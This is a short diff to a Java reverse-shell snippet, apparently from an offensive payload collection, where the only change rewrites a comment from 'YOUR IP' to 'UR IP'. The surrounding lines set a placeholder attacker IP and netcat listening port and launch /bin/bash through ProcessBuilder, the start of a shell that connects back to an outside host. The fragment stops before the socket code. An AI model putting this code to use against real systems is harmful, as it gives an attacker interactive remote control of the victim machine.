@@ -1,4 +1,4 @@
-String host="IP_ADDRESS";  /* ---> YOUR IP */
+String host="IP_ADDRESS";  /* ---> UR IP */
 int port=PORT; /* ---> YOUR LISTENING PORT (netcat) */
 String cmd="/bin/bash";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
